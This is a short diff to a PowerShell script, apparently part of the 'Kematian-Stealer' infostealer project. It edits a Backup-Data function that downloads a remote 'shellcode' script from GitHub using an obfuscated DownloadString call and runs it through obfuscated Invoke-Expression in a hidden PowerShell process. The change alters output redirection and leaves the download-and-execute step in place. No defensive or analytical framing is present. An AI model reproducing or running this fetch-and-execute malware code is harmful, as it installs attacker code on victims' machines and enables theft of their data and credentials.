@@ -894,11 +894,8 @@ function Backup-Data {
     Write-Host "[!] Injecting Shellcode !"
     $kematian_shellcode = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
-    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput
-    $output = $proc.StandardOutput.ReadToEnd()
+    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru -RedirectStandardOutput $PSCommandPath:stdout
     $proc.WaitForExit()
-    $lines = $output -split "`r`n"
-    $lines | Out-File "outputKDOT.txt"
     Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
 
     $main_temp = "$env:localappdata\temp"
